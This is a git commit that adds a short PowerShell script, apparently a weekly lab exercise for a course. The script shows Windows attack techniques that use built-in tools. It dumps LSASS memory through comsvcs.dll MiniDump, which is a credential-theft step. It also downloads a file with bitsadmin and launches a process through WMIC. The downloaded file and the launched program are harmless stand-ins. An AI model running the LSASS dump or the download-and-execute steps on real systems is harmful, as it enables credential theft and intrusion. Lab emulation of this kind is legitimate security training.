0df60774c98119e51ed107a2e6c9015328181918
Nicholas Spagnola <39714515+EvaStanAccount@users.noreply.github.com>
2024-03-19 12:23:06 -0400

    Add files via upload

---
+++ Week10.ps1
@@ -0,0 +1,10 @@
+﻿$a = Get-Process lsass
+$a.Id
+
+C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $a C:\temp\lsass.dmp full
+
+
+C:\Windows\System32\bitsadmin.exe /create 1 
+C:\Windows\System32\bitsadmin.exe /addfile 1 https://raw.githubusercontent.com/EvaStanAccount/IT4077/Main/TestFile.txt c:\Users\Administrator\test.txt 
+C:\Windows\System32\bitsadmin.exe /resume 1
+C:\Windows\System32\wbem\WMIC.exe process call create "cmd.exe /c notepad.exe"
